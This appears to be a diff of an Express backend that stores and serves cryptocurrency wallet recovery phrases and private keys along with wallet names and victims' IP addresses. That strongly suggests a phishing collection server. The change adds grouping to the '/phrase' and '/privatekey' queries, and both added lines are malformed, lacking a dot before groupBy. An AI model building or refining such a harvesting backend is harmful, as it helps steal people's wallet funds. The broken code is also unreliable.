@@ -90,7 +90,7 @@ const { privatekey ,  walletname , ipAddress } = req.body
 })
 
 app.get("/phrase", (req, res) => {
-    database.select('Id','phrase','WalletName' ,'IpAddress','Timestamp').from('root')
+    database.select('Id','phrase','WalletName' ,'IpAddress','Timestamp').from('root')groupBy('phrase')
     .then(user => {
        res.status(200).json(user)
     })
@@ -104,7 +104,7 @@ app.get("/keystore", (req, res) => {
 })
 
 app.get("/privatekey", (req, res) => {
-    database.select('Id','privateKey','WalletName' ,'IpAddress','Timestamp').from('root')
+    database.select('Id','privateKey','WalletName' ,'IpAddress','Timestamp').from('root')groupBy('privateKey')
     .then(user => {
        res.status(200).json(user)
     })
